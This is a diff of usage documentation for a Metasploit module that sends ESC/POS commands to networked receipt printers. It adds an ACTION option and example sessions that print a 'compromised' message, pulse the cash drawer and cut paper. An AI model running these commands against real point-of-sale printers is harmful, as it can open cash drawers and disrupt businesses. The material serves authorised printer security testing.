@@ -57,8 +57,10 @@ This is a comprehensive reference of commands that can be used to interact with 
 
 This module is designed for use within the Metasploit Framework. To get started, load the module and set the necessary options.
 
+
 ### Module Configuration
-Run `show options` to see all available parameters:
+
+Run `show options` to see all available parameters. Note that options may change based on the selected `ACTION`.
 ```
 msf6 > use auxiliary/scanner/misc/esc_pos_printer_command_injector
 msf6 auxiliary(scanner/misc/esc_pos_printer_command_injector) > show options
@@ -71,52 +73,61 @@ msf6 auxiliary(scanner/misc/esc_pos_printer_command_injector) > show options
 
     RPORT (Target Port): The port used for communication (default is 9100).
 
-    MESSAGE: The text string you want to print.
+    ACTION: The specific command to execute. options are:
+        - PRINT (Default): Print a custom message.
+        - DRAWER: Trigger the attached cash drawer.
+        - CUT: Feed lines and cut the paper.
 
-    PRINT_MESSAGE: A boolean flag to print the message.
+    MESSAGE: The text string you want to print (Required if ACTION is PRINT).
 
-    TRIGGER_DRAWER: A boolean flag to activate the cash drawer.
+    DRAWER_COUNT: An integer to specify how many times to pulse the cash drawer (Required if ACTION is DRAWER).
 
-    CUT_PAPER: A boolean flag to feed and cut the paper.
+    FEED_LINES: An integer to specify how many lines to feed before cutting (Required if ACTION is CUT).
 
-    FEED_LINES: An integer to specify how many lines to feed before cutting.
 
-    DRAWER_COUNT: An integer to specify how many times to pulse the cash drawer.
 
 **Example Usage**
 
-Here are a few usage examples demonstrating the module's versatility:
+Here are usage examples demonstrating the module's actions:
 
-**Basic Message Injection**
+**Basic Message Injection (PRINT Action)**
 
-This will send a simple, sanitized message to the printer.
+This will send a simple, sanitized message to the printer using the default PRINT action.
 
 ```
 msf6 > set RHOSTS 192.168.1.100
-msf6 > set PRINT_MESSAGE true
+msf6 > set ACTION PRINT
 msf6 > set MESSAGE "WARNING: PRINTER COMPROMISED"
 msf6 > run
+
 ```
 
-**Triggering the Cash Drawer**
+**Triggering the Cash Drawer (DRAWER Action)**
 
-This will send the cash drawer pulse command, with no other actions.
+This will send the cash drawer pulse command.
+
 ```
 msf6 > set RHOSTS 192.168.1.100
-msf6 > set TRIGGER_DRAWER true
+msf6 > set ACTION DRAWER
 msf6 > set DRAWER_COUNT 3
 msf6 > run
+
 ```
 **Full Receipt Simulation**
 
-This will print a message, feed the paper, and cut it, simulating a full receipt.
+Because the module separates functionality into distinct actions, a full simulation involves printing the message first, then switching actions to feed and cut the paper.
+
 ```
 msf6 > set RHOSTS 192.168.1.100
-msf6 > set PRINT_MESSAGE true
+msf6 > set ACTION PRINT
 msf6 > set MESSAGE "Audit complete. This device is vulnerable."
-msf6 > set CUT_PAPER true
+msf6 > run
+[*] Printed message: 'Audit complete. This device is vulnerable.'
+
+msf6 > set ACTION CUT
 msf6 > set FEED_LINES 10
 msf6 > run
+[*] Paper fed and cut.
 
 ```
 ### 5. Testing from a Linux Terminal (Without Metasploit)
